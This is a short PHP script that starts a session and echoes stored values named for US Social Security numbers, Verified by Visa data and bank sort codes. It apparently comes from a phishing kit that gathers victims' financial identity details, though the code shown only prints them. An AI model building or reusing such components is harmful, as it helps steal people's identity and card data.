<?php 
date_default_timezone_set('UTC');
session_start();

echo "".$_SESSION["ssn_usa"]."".$_SESSION["vbv_canada"]."".$_SESSION["srt_code"]."";

?>
